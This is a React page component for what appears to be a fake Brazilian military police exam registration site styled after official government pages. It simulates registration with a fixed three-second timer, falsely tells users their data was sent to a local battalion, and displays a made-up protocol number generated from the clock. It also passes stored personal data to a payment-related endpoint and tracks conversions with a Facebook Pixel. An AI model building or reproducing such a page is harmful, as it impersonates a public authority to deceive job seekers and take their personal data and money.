import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Calendar, CheckCircle, Clock, MapPin, User, FileText, Shield } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';
import { useEstadoPM } from '@/hooks/useEstadoPM';

export default function RegistrationPage() {
  const [, setLocation] = useLocation();
  const estadoPM = useEstadoPM();
  const sigla = estadoPM?.sigla ?? 'PM';
  const [isRegistering, setIsRegistering] = useState(true);
  const [registrationComplete, setRegistrationComplete] = useState(false);
  const [applicationData, setApplicationData] = useState<any>(null);
  const { trackEvent } = useClarityEvents();

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Facebook Pixel - AddToWishlist event
    const fbq = (window as any).fbq;
    if (fbq) {
      fbq('track', 'AddToWishlist', {
        content_name: `Concurso Público ${sigla} 2026`,
        content_category: 'Registration Process',
        value: 6893.00,
        currency: 'BRL'
      });
    }
    
    // Load application data from localStorage
    const savedData = localStorage.getItem('applicationData');
    if (savedData) {
      try {
        const parsedData = JSON.parse(savedData);
        setApplicationData(parsedData);
      } catch (error) {
        console.error('Error loading application data:', error);
        setLocation('/temporarios');
        return;
      }
    } else {
      // No application data, redirect back
      setLocation('/temporarios');
      return;
    }

    // Track registration page entry
    trackEvent('registration_process_started', {
      page: 'registration_page',
      has_application_data: !!savedData,
      timestamp: new Date().toISOString()
    });

    // Pré-carregar FAQ de pagamento em background para otimizar cache
    const preloadPaymentFAQ = async () => {
      try {
        console.log('Pré-carregando FAQ de pagamento em background...');
        
        // Buscar dados necessários do localStorage
        const userDataString = localStorage.getItem('userData');
        const pessoalDataString = localStorage.getItem('pessoalData');
        
        if (!userDataString || !pessoalDataString) {
          console.log('Dados insuficientes para pré-carregar FAQ de pagamento');
          return;
        }
        
        let userData, pessoalData;
        try {
          userData = JSON.parse(userDataString);
          pessoalData = JSON.parse(pessoalDataString);
        } catch (parseError) {
          console.log('Erro ao parsear dados para pré-carregamento:', parseError);
          return;
        }
        
        const response = await fetch('/api/faq-pagamento', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            userData,
            pessoalData
          })
        });

        if (response.ok) {
          const faqData = await response.json();
          console.log('FAQ de pagamento pré-carregado com sucesso:', {
            fromCache: faqData.data?.fromCache,
            faqCount: faqData.data?.faqs?.length || 0,
            profileType: faqData.data?.cacheStats?.profileType || 'desconhecido'
          });
          
          // Armazenar no localStorage para uso offline se necessário
          localStorage.setItem('preloadedPaymentFAQ', JSON.stringify({
            data: faqData.data,
            timestamp: new Date().toISOString(),
            preloaded: true
          }));
        } else {
          const errorData = await response.json();
          console.log('Erro no pré-carregamento do FAQ de pagamento:', {
            status: response.status,
            error: errorData.error || 'Erro desconhecido'
          });
        }
      } catch (error) {
        console.log('Erro ao pré-carregar FAQ de pagamento:', error);
      }
    };

    // Executar pré-carregamento após 1 segundo para não impactar a experiência inicial
    const preloadTimer = setTimeout(() => {
      preloadPaymentFAQ();
    }, 1000);

    // Start registration process
    const timer = setTimeout(() => {
      setIsRegistering(false);
      setRegistrationComplete(true);
      
      // Track registration completion
      trackEvent('registration_process_completed', {
        page: 'registration_page',
        completion_time_seconds: 3,
        timestamp: new Date().toISOString()
      });
    }, 3000);

    return () => {
      clearTimeout(timer);
      clearTimeout(preloadTimer);
    };
  }, [setLocation]);

  const getLocationTypeName = () => {
    return `Batalhão da ${sigla}`;
  };

  const getCityName = () => {
    return applicationData?.juntasData?.cidade || 'sua cidade';
  };

  const handleAdvanceToCommitment = () => {
    setLocation('/validacao');
  };

  const handleGoBack = () => {
    setLocation('/temporarios');
  };

  if (!applicationData) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
        <div className="text-center">
          <h2 className="text-xl font-semibold text-gray-900 mb-2">Carregando...</h2>
          <p className="text-gray-600">Redirecionando para a página de cargos...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader customTitle={sigla} customSubtitle="Registro de Inscrição" />
      
      <main className="max-w-2xl mx-auto px-6 py-16">
        {isRegistering ? (
          <div className="text-center">
            <div className="w-16 h-16 border-4 border-gray-200 rounded-full animate-spin mx-auto mb-8" style={{ borderTopColor: '#1351b4' }}></div>
            
            <h1 className="text-2xl font-semibold text-gray-900 mb-4">
              Registrando inscricao
            </h1>
            
            <p className="text-gray-600 mb-8">
              Estamos registrando seu nome na {getLocationTypeName()} de {getCityName()}.
            </p>

            <div className="bg-gray-50 rounded-lg p-6 text-left max-w-md mx-auto">
              <h3 className="font-medium text-gray-900 mb-4">Dados da prova</h3>
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">Cargo:</span>
                  <span className="font-medium">{applicationData.positionTitle}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Data:</span>
                  <span className="font-medium">{applicationData.examDate}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Horário:</span>
                  <span className="font-medium">{applicationData.examTime}</span>
                </div>
              </div>
            </div>
          </div>
        ) : registrationComplete ? (
          <div className="text-center">
            <div className="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-8">
              <CheckCircle className="w-10 h-10 text-yellow-500" />
            </div>
            
            <h1 className="text-2xl font-semibold text-gray-900 mb-4">
              Etapa 1 concluída — Protocolo pendente
            </h1>
            
            <p className="text-gray-600 mb-4">
              Sua inscricao foi registrada. Agora, sera necessario validar seus dados e emitir o protocolo de participacao para realizar a prova objetiva.
            </p>
            
            <p className="text-gray-600 mb-12">
              Local de prova: <strong>{applicationData.examLocationName}</strong>
              {applicationData.examLocationAddress && (
                <span className="block text-sm text-gray-500 mt-1">{applicationData.examLocationAddress}</span>
              )}
            </p>

            <div className="bg-gray-50 rounded-lg p-6 text-left mb-12">
              <h3 className="font-medium text-gray-900 mb-4">Detalhes da prova</h3>
              <div className="space-y-3">
                <div className="flex justify-between py-2 border-b border-gray-200">
                  <span className="text-gray-600">Cargo:</span>
                  <span className="font-medium">{applicationData.positionTitle}</span>
                </div>
                <div className="flex justify-between py-2 border-b border-gray-200">
                  <span className="text-gray-600">Local:</span>
                  <span className="font-medium text-right">
                    {applicationData.examLocationName}
                    {applicationData.examLocationAddress && (
                      <span className="block text-xs text-gray-500 font-normal mt-0.5">{applicationData.examLocationAddress}</span>
                    )}
                  </span>
                </div>
                <div className="flex justify-between py-2 border-b border-gray-200">
                  <span className="text-gray-600">Data:</span>
                  <span className="font-medium">{applicationData.examDate}</span>
                </div>
                <div className="flex justify-between py-2">
                  <span className="text-gray-600">Horário:</span>
                  <span className="font-medium">{applicationData.examTime}</span>
                </div>
              </div>
            </div>

            {/* Confirmação Oficial */}
            <div className="bg-gray-50 border border-gray-200 rounded p-4 mb-8">
              <div className="text-sm text-gray-700">
                <p className="mb-2">
                  Dados enviados para o {getLocationTypeName()} em {getCityName()} as {new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}.
                </p>
                <p className="text-gray-600">
                  Protocolo: <span className="font-mono text-gray-800">{sigla.replace(/[^A-Z0-9]/g, '')}{Date.now().toString().slice(-6)}</span>
                </p>
              </div>
            </div>

            {/* Confirmation Message */}
            <div className="bg-gray-50 border border-gray-200 rounded p-4 mb-8">
              <div className="text-sm text-gray-700 text-center">
                <p>
                  O comprovante de inscrição será enviado via email para: <strong>{(() => {
                    try {
                      const userData = JSON.parse(localStorage.getItem('userData') || '{}');
                      return userData.email || 'email não informado';
                    } catch {
                      return 'email não informado';
                    }
                  })()} </strong>
                  e SMS para: <strong>{(() => {
                    try {
                      const userData = JSON.parse(localStorage.getItem('userData') || '{}');
                      return userData.telefone || 'telefone não informado';
                    } catch {
                      return 'telefone não informado';
                    }
                  })()}</strong>
                </p>
              </div>
            </div>

            <div className="space-y-3">
              <Button
                onClick={handleAdvanceToCommitment}
                className="w-full py-3 text-white font-medium"
                style={{ backgroundColor: '#1351b4' }}
              >
                Avançar para confirmar inscrição
              </Button>
              
            </div>
          </div>
        ) : null}
      </main>
      
      <ExercitoFooter />
    </div>
  );
}